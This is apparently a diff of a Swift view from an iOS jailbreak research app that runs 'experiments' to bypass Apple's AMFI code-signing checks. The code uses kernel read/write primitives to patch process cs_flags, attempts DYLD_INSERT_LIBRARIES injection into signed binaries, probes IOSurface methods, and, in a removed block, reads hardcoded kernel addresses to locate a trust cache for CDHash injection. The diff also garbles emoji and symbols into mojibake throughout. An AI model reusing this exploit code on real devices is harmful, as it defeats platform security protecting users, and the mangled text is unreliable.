         // Step 4: Read p_flag (SAFE)
         let amfidPFlag = ds_kread32(amfidProc + UInt64(off_proc_p_flag))
@@ -1195,9 +1195,9 @@ struct AMFIExperimentView: View {
         // Step 5: Read task pointer (SAFE to read pointer, NOT safe to dereference task internals)
         let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
         detail += "amfid task ptr: 0x\(String(format: "%llx", amfidTask))\n"
-        detail += "⚠️ Cannot read task internals (itk_space, threads → panic)\n"
+        detail += "âš ï¸ Cannot read task internals (itk_space, threads â†’ panic)\n"
         
-        // Step 6: Read ucred (SAFE — pointer in proc_ro)
+        // Step 6: Read ucred (SAFE â€” pointer in proc_ro)
         var ucredAddr: UInt64 = 0
         if amfidProcRo != 0 {
             ucredAddr = ds_kread64(amfidProcRo + UInt64(off_proc_ro_p_ucred))
@@ -1239,21 +1239,21 @@ struct AMFIExperimentView: View {
         }
         
         detail += "\n=== CONCLUSION ===\n"
-        detail += "RC to amfid: ❌ IMPOSSIBLE (hangs — single-threaded)\n"
-        detail += "Task internals: ❌ INACCESSIBLE (wrong kernel zone)\n"
+        detail += "RC to amfid: âŒ IMPOSSIBLE (hangs â€” single-threaded)\n"
+        detail += "Task internals: âŒ INACCESSIBLE (wrong kernel zone)\n"
         detail += "amfid is CS_PLATFORM_BINARY with uid=0\n\n"
         detail += "Remaining AMFI bypass paths:\n"
-        detail += "• Trust cache injection (find TC struct in kernel heap)\n"
-        detail += "• IOSurface external method exploitation\n"
-        detail += "• Kernel function hooking (if we find writable code)\n"
-        detail += "• Developer mode exploitation (already enabled!)\n"
+        detail += "â€¢ Trust cache injection (find TC struct in kernel heap)\n"
+        detail += "â€¢ IOSurface external method exploitation\n"
+        detail += "â€¢ Kernel function hooking (if we find writable code)\n"
+        detail += "â€¢ Developer mode exploitation (already enabled!)\n"
         
-        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥 amfid research", success: true, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ amfid research", success: true, detail: detail, timestamp: Date())
     }
     
-    // MARK: - 🔥🔥🔥🔥🔥🔥🔥 Experiment 61: ALL REMAINING PATHS
+    // MARK: - ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ Experiment 61: ALL REMAINING PATHS
     
-    /// Experiment 61: Combined final assault — all remaining bypass paths in one
+    /// Experiment 61: Combined final assault â€” all remaining bypass paths in one
     /// 1. Trust Cache scan (find TC linked list via known kernel symbols)
     /// 2. Developer mode spawn (special flags for dev-mode enabled devices)
     /// 3. posix_spawn with responsibility_spawnattrs (launchd managed spawn)
@@ -1262,16 +1262,16 @@ struct AMFIExperimentView: View {
     private func expFinalAssault(rc: RemoteCall) -> ExperimentResult {
         let mem = rc.trojanMem
         let mgr = dspmgr.shared
-        var detail = "🔥 FINAL ASSAULT — All remaining paths\n\n"
+        var detail = "ðŸ”¥ FINAL ASSAULT â€” All remaining paths\n\n"
         var anySuccess = false
         
-        // ═══════════════════════════════════════════════
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         // PATH 1: Developer Mode Spawn
         // Developer mode = 1 (confirmed). On iOS 16+, dev mode
         // allows some unsigned code execution for development.
         // Try: posix_spawnattr with _POSIX_SPAWN_DISABLE_ASLR + persona
-        // ═══════════════════════════════════════════════
-        detail += "═══ PATH 1: Developer Mode Spawn ═══\n"
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        detail += "â•â•â• PATH 1: Developer Mode Spawn â•â•â•\n"
         
         // Copy binary first
         let srcPath = remote_alloc_str(rc, "/bin/df")
@@ -1316,18 +1316,18 @@ struct AMFIExperimentView: View {
             
             detail += "  \(name): ret=\(ret)\n"
             if ret == 0 {
-                detail += "  🎉 SPAWN SUCCESS!\n"
+                detail += "  ðŸŽ‰ SPAWN SUCCESS!\n"
                 anySuccess = true
             }
             RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
         }
         
-        // ═══════════════════════════════════════════════
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         // PATH 2: CS_DEBUGGED on child before exec
-        // Fork child → patch its cs_flags to add CS_DEBUGGED → then spawn
+        // Fork child â†’ patch its cs_flags to add CS_DEBUGGED â†’ then spawn
         // CS_DEBUGGED tells AMFI "debugger attached, relax checks"
-        // ═══════════════════════════════════════════════
-        detail += "\n═══ PATH 2: CS_DEBUGGED patch + spawn ═══\n"
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        detail += "\nâ•â•â• PATH 2: CS_DEBUGGED patch + spawn â•â•â•\n"
         
         // Fork to create child
         let childPid = RootExecutor.rcall(rc, "fork")
@@ -1345,10 +1345,10 @@ struct AMFIExperimentView: View {
                     let newFlags = (currentFlags | 0x4800) & ~UInt32(0x000C)
                     ds_kwrite32(childProcRo + 0x1c, newFlags)
                     let afterFlags = ds_kread32(childProcRo + 0x1c)
-                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) → 0x\(String(format: "%x", afterFlags))\n"
+                    detail += "cs_flags: 0x\(String(format: "%x", currentFlags)) â†’ 0x\(String(format: "%x", afterFlags))\n"
                     
                     if afterFlags != currentFlags {
-                        detail += "✅ CS_DEBUGGED patched on child!\n"
+                        detail += "âœ… CS_DEBUGGED patched on child!\n"
                     }
                 }
             }
@@ -1357,7 +1357,7 @@ struct AMFIExperimentView: View {
             RootExecutor.rcall(rc, "kill", childPid, 9)
             RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
             
-            // Now: spawn the copied binary — AMFI checks the NEW process
+            // Now: spawn the copied binary â€” AMFI checks the NEW process
             // Patch cs_flags AFTER spawn (race condition approach)
             detail += "\nSpawn + immediate cs_flags patch (race)...\n"
             let argvBase2 = mem + 0x1C00
@@ -1385,7 +1385,7 @@ struct AMFIExperimentView: View {
                         let spFlags = ds_kread32(spProcRo + 0x1c)
                         let spNewFlags = (spFlags | 0x4800) & ~UInt32(0x000C) // +DEBUGGED +GET_TASK_ALLOW -HARD -KILL
                         ds_kwrite32(spProcRo + 0x1c, spNewFlags)
-                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) → 0x\(String(format: "%x", spNewFlags))\n"
+                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) â†’ 0x\(String(format: "%x", spNewFlags))\n"
                     }
                 }
                 
@@ -1407,11 +1407,11 @@ struct AMFIExperimentView: View {
                 let sig = status & 0x7F
                 
                 if exited && exitCode == 0 {
-                    detail += "🎉🎉🎉 PROCESS RAN AND EXITED NORMALLY! 🎉🎉🎉\n"
+                    detail += "ðŸŽ‰ðŸŽ‰ðŸŽ‰ PROCESS RAN AND EXITED NORMALLY! ðŸŽ‰ðŸŽ‰ðŸŽ‰\n"
                     detail += "CS_DEBUGGED BYPASS WORKS!\n"
                     anySuccess = true
                 } else if signaled && sig == 9 {
-                    detail += "❌ Killed by SIGKILL (AMFI still enforcing)\n"
+                    detail += "âŒ Killed by SIGKILL (AMFI still enforcing)\n"
                 } else if waitRet == 0 {
                     detail += "Process still running (not reaped yet)\n"
                     RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 9)
@@ -1423,29 +1423,29 @@ struct AMFIExperimentView: View {
             RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr2)
         }
         
-        // ═══════════════════════════════════════════════
-        // PATH 3: Trust Cache — DISABLED (neighbor scan causes panic)
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        // PATH 3: Trust Cache â€” DISABLED (neighbor scan causes panic)
         // Reading arbitrary addresses near pmap_cs hits inaccessible zones
-        // ═══════════════════════════════════════════════
-        detail += "\n═══ PATH 3: Trust Cache scan ═══\n"
-        detail += "⚠️ DISABLED — scanning kernel memory near pmap_cs causes panic\n"
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        detail += "\nâ•â•â• PATH 3: Trust Cache scan â•â•â•\n"
+        detail += "âš ï¸ DISABLED â€” scanning kernel memory near pmap_cs causes panic\n"
         detail += "Socket KRW cannot safely read arbitrary __DATA addresses\n"
         let pointerCandidates: [(Int, UInt64)] = []
         
-        // ═══════════════════════════════════════════════
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         // PATH 4: IOSurface external method 9 (getValue)
         // IOSurface user client has methods that read/write kernel objects
         // Selector 9 = s_get_value, Selector 10 = s_set_value
         // These operate on IOSurface properties in kernel heap!
-        // ═══════════════════════════════════════════════
-        detail += "\n═══ PATH 4: IOSurface getValue/setValue ═══\n"
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        detail += "\nâ•â•â• PATH 4: IOSurface getValue/setValue â•â•â•\n"
         
         guard let sb = dspmgr.shared.sbProc else {
             detail += "No SpringBoard RC\n"
             RootExecutor.rcall(rc, "unlink", dstPath)
             RootExecutor.rcall(rc, "free", srcPath)
             RootExecutor.rcall(rc, "free", dstPath)
-            return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
+            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
         }
         
         let sbMem = sb.trojanMem
@@ -1482,10 +1482,10 @@ struct AMFIExperimentView: View {
                                                 scalarOut, scalarOutCnt)
                     if ret == 0 {
                         let out = sb[scalarOut].value64()
-                        detail += "  ✅ IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
+                        detail += "  âœ… IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
                         anySuccess = true
                     } else if ret != 0xe00002bc && ret != 0xe00002c7 {
-                        detail += "  ⚠️ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
+                        detail += "  âš ï¸ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                     }
                 }
                 
@@ -1496,11 +1496,11 @@ struct AMFIExperimentView: View {
         }
         RootExecutor.rcall(sb, "free", ioSvcName)
         
-        // ═══════════════════════════════════════════════
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         // PATH 5: Spawn signed binary via symlink (already works!)
         // + try to make it load OUR dylib via DYLD_INSERT_LIBRARIES
-        // ═══════════════════════════════════════════════
-        detail += "\n═══ PATH 5: DYLD_INSERT via env ═══\n"
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        detail += "\nâ•â•â• PATH 5: DYLD_INSERT via env â•â•â•\n"
         
         // Write a fake dylib to /tmp (just Mach-O header)
         let fakeDylib = "/tmp/.dsp_inject.dylib"
@@ -1541,8 +1541,8 @@ struct AMFIExperimentView: View {
         detail += "Spawn /bin/df + DYLD_INSERT: ret=\(dyldRet), pid=\(dyldPid), wait=\(dyldWait)\n"
         
         if dyldRet == 0 {
-            detail += "Spawn succeeded — check if dylib was loaded (need output capture)\n"
-            // If DYLD_INSERT works → we can inject code into ANY signed process!
+            detail += "Spawn succeeded â€” check if dylib was loaded (need output capture)\n"
+            // If DYLD_INSERT works â†’ we can inject code into ANY signed process!
         }
         
         RootExecutor.rcall(rc, "free", dyldEnv)
@@ -1556,215 +1556,16 @@ struct AMFIExperimentView: View {
         RootExecutor.rcall(rc, "free", srcPath)
         RootExecutor.rcall(rc, "free", dstPath)
         
-        // ═══════════════════════════════════════════════
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
         // SUMMARY
-        // ═══════════════════════════════════════════════
-        detail += "\n═══ SUMMARY ═══\n"
+        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+        detail += "\nâ•â•â• SUMMARY â•â•â•\n"
         detail += "Paths tested: 5\n"
-        detail += anySuccess ? "🔥 Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
+        detail += anySuccess ? "ðŸ”¥ Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
         
-        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
-    }
-    
-    // MARK: - 🔥🔥🔥🔥🔥🔥🔥🔥 Experiment 62: Trust Cache Injection
-    
-    /// Experiment 62: Try to READ trust cache candidates from __DATA via socket KRW
-    /// Kernelcache analysis found trust cache structs in __DATA segment.
-    /// If socket KRW can reach them → we can INJECT our CDHash → full jailbreak!
-    ///
-    /// Key addresses (unslid, add kernel_slide):
-    /// - pmap_cs_allow_invalid: 0xfffffff00a0e45b8 (CONFIRMED accessible)
-    /// - Trust cache candidates: 0xfffffff00a0f24b0, 0xfffffff00a0f7148, etc.
-    /// - Mystery value at pmap_cs-48: 0xfffffff00a0e4588 = 0x40000002000
-    ///
-    /// Strategy: try reading FIRST trust cache candidate. If no panic → we're in!
-    /// Then verify it's a real trust cache (version=2, valid CDHashes)
-    /// Then WRITE our binary's CDHash into the entries array!
-    private func expTrustCacheInjection(rc: RemoteCall) -> ExperimentResult {
-        let mgr = dspmgr.shared
-        let slide = mgr.kernslide
-        var detail = "🔥 Trust Cache Injection Attempt\n\n"
-        detail += "Kernel slide: 0x\(String(format: "%llx", slide))\n\n"
-        
-        // Known accessible: pmap_cs_allow_invalid at 0xfffffff00a0e45b8
-        let pmapCSUnslid: UInt64 = 0xfffffff00a0e45b8
-        let pmapCSAddr = pmapCSUnslid + slide
-        
-        // Verify our KRW still works
-        let pmapVal = ds_kread32(pmapCSAddr)
-        detail += "Verify KRW: pmap_cs=\(pmapVal) at 0x\(String(format: "%llx", pmapCSAddr)) ✅\n\n"
-        
-        // ═══════════════════════════════════════════════
-        // TEST 1: Read the mystery value at pmap_cs - 48
-        // In kernelcache this is 0x40000002000 — what is it at runtime?
-        // ═══════════════════════════════════════════════
-        detail += "=== Test 1: pmap_cs neighbors ===\n"
-        let neighborAddr = pmapCSAddr - 48
-        let neighborVal = ds_kread64(neighborAddr)
-        detail += "pmap_cs-48 (0x\(String(format: "%llx", neighborAddr))): 0x\(String(format: "%llx", neighborVal))\n"
-        
-        // Also read pmap_cs-8, -16, +8, +16 (very close = same cache line = safe)
-        let offsets: [Int64] = [-16, -8, 0, 8, 16]
-        for off in offsets {
-            let addr = UInt64(Int64(pmapCSAddr) + off)
-            let val = ds_kread64(addr)
-            if val != 0 || off == 0 {
-                detail += "  pmap_cs\(off >= 0 ? "+" : "")\(off): 0x\(String(format: "%llx", val))\n"
-            }
-        }
-        
-        // ═══════════════════════════════════════════════
-        // TEST 2: Try reading FIRST trust cache candidate
-        // 0xfffffff00a0f24b0 — 128 entries, ~870KB from pmap_cs
-        // This is still in __DATA segment, MIGHT be same zone
-        // ═══════════════════════════════════════════════
-        detail += "\n=== Test 2: Trust Cache candidate read ===\n"
-        
-        // Start with addresses CLOSEST to pmap_cs (most likely same zone)
-        // pmap_cs is at 0xfffffff00a0e45b8
-        // First candidate at 0xfffffff00a0f24b0 (distance: 0xDEF8 = 57080 bytes)
-        
-        // But first — try reading just ONE address slightly further out
-        // to test if the zone extends beyond pmap_cs's immediate area
-        let testAddr1 = pmapCSAddr + 0x1000  // 4KB away (next page)
-        let testVal1 = ds_kread64(testAddr1)
-        detail += "pmap_cs+0x1000: 0x\(String(format: "%llx", testVal1)) "
-        detail += (testVal1 != 0 ? "✅ readable!\n" : "(zero but no panic = readable)\n")
-        
-        let testAddr2 = pmapCSAddr + 0x4000  // 16KB away
-        let testVal2 = ds_kread64(testAddr2)
-        detail += "pmap_cs+0x4000: 0x\(String(format: "%llx", testVal2)) "
-        detail += (testVal2 != 0 ? "✅ readable!\n" : "(zero/readable)\n")
-        
-        let testAddr3 = pmapCSAddr + 0x10000  // 64KB away
-        let testVal3 = ds_kread64(testAddr3)
-        detail += "pmap_cs+0x10000: 0x\(String(format: "%llx", testVal3)) "
-        detail += (testVal3 != 0 ? "✅ readable!\n" : "(zero/readable)\n")
-        
-        // If we get here without panic, try the trust cache candidate!
-        // 0xfffffff00a0f24b0 is at offset +0xDEF8 from pmap_cs
-        let tcCandidateUnslid: UInt64 = 0xfffffff00a0f24b0
-        let tcAddr = tcCandidateUnslid + slide
-        let distFromPmap = tcAddr - pmapCSAddr
-        
-        detail += "\nTrust cache candidate: 0x\(String(format: "%llx", tcAddr))\n"
-        detail += "Distance from pmap_cs: 0x\(String(format: "%llx", distFromPmap)) (\(distFromPmap) bytes)\n"
-        
-        // READ the first 24 bytes (version + uuid + num_entries)
-        let tcVersion = ds_kread32(tcAddr)
-        detail += "Read version field: \(tcVersion)\n"
-        
-        if tcVersion == 2 || tcVersion == 1 {
-            detail += "✅ VERSION MATCHES! This might be a real trust cache!\n\n"
-            
-            // Read UUID (16 bytes)
-            var uuid = [UInt8](repeating: 0, count: 16)
-            for i in 0..<2 {
-                let val = ds_kread64(tcAddr + 4 + UInt64(i * 8))
-                for j in 0..<8 {
-                    uuid[i*8+j] = UInt8((val >> (j*8)) & 0xFF)
-                }
-            }
-            let uuidStr = uuid.map { String(format: "%02x", $0) }.joined()
-            detail += "UUID: \(uuidStr)\n"
-            
-            // Read num_entries
-            let numEntries = ds_kread32(tcAddr + 20)
-            detail += "Num entries: \(numEntries)\n"
-            
-            if numEntries > 0 && numEntries < 50000 {
-                detail += "\n✅✅✅ VALID TRUST CACHE FOUND! ✅✅✅\n"
-                detail += "Version=\(tcVersion), Entries=\(numEntries)\n\n"
-                
-                // Read first CDHash to verify
-                let firstEntry = tcAddr + 24
-                var cdhash = [UInt8](repeating: 0, count: 20)
-                for i in 0..<3 {
-                    let val = ds_kread64(firstEntry + UInt64(i * 8))
-                    for j in 0..<min(8, 20 - i*8) {
-                        cdhash[i*8+j] = UInt8((val >> (j*8)) & 0xFF)
-                    }
-                }
-                let cdhashStr = cdhash.map { String(format: "%02x", $0) }.joined()
-                detail += "First CDHash: \(cdhashStr)\n"
-                
-                let isValidHash = Set(cdhash).count >= 8
-                if isValidHash {
-                    detail += "✅ High entropy — REAL CDHash!\n\n"
-                    detail += "🎉🎉🎉 TRUST CACHE IS ACCESSIBLE VIA SOCKET KRW! 🎉🎉🎉\n\n"
-                    detail += "NEXT STEP: Write our binary's CDHash into this trust cache!\n"
-                    detail += "1. Compute CDHash of our copied binary\n"
-                    detail += "2. Increment num_entries by 1\n"
-                    detail += "3. Write CDHash at entries[num_entries]\n"
-                    detail += "4. Try spawn → FULL JAILBREAK!\n"
-                } else {
-                    detail += "Low entropy — might be structured data, not real CDHash\n"
-                    detail += "Try next candidate...\n"
-                }
-            } else {
-                detail += "num_entries=\(numEntries) — doesn't look like trust cache\n"
-                detail += "Might be coincidental version=2 match\n"
-            }
-        } else {
-            detail += "Version=\(tcVersion) — NOT a trust cache (expected 1 or 2)\n"
-            detail += "This address might contain different data at runtime\n"
-            detail += "(kernelcache values change after boot)\n\n"
-            
-            // Try a few more candidates
-            let moreCandidates: [(String, UInt64)] = [
-                ("0xfffffff00a0f7148", 0xfffffff00a0f7148),
-                ("0xfffffff00a0f8f88", 0xfffffff00a0f8f88),
-                ("0xfffffff00a0fc434", 0xfffffff00a0fc434),
-            ]
-            
-            detail += "Trying more candidates...\n"
-            for (name, unslid) in moreCandidates {
-                let addr = unslid + slide
-                let ver = ds_kread32(addr)
-                let entries = ds_kread32(addr + 20)
-                detail += "  \(name): version=\(ver), entries=\(entries)\n"
-                if ver == 1 || ver == 2 {
-                    if entries > 0 && entries < 50000 {
-                        detail += "    ✅ POSSIBLE TRUST CACHE!\n"
-                    }
-                }
-            }
-        }
-        
-        // ═══════════════════════════════════════════════
-        // TEST 3: Scan for runtime trust cache (dynamically allocated)
-        // At runtime, trust caches are allocated via kalloc
-        // The HEAD pointer might be stored near pmap_cs variables
-        // ═══════════════════════════════════════════════
-        detail += "\n=== Test 3: Runtime trust cache pointers ===\n"
-        
-        // Read values around pmap_cs that look like kernel pointers
-        // These might be trust cache list head or related globals
-        var foundPointers: [(Int64, UInt64)] = []
-        for off in stride(from: Int64(-256), through: Int64(256), by: 8) {
-            let addr = UInt64(Int64(pmapCSAddr) + off)
-            let val = ds_kread64(addr)
-            // Check if it looks like a kernel heap pointer (0xfffffffeXXXXXXXX pattern)
-            if val > 0xfffffffe00000000 && val < 0xffffffffffff0000 {
-                foundPointers.append((off, val))
-            }
-        }
-        
-        if !foundPointers.isEmpty {
-            detail += "Found \(foundPointers.count) kernel heap pointers near pmap_cs!\n"
-            for (off, val) in foundPointers.prefix(10) {
-                detail += "  pmap_cs\(off >= 0 ? "+" : "")\(off): 0x\(String(format: "%llx", val))\n"
-            }
-            detail += "\nThese might point to runtime trust cache modules!\n"
-            detail += "NEXT: dereference each to check struct layout\n"
-        } else {
-            detail += "No kernel heap pointers found near pmap_cs\n"
-            detail += "Trust cache list head might be further away\n"
-        }
-        
-        let success = detail.contains("🎉🎉🎉") || detail.contains("VALID TRUST CACHE") || !foundPointers.isEmpty
-        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥🔥 Trust Cache", success: success, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
     }
     
     #endif
 }
+
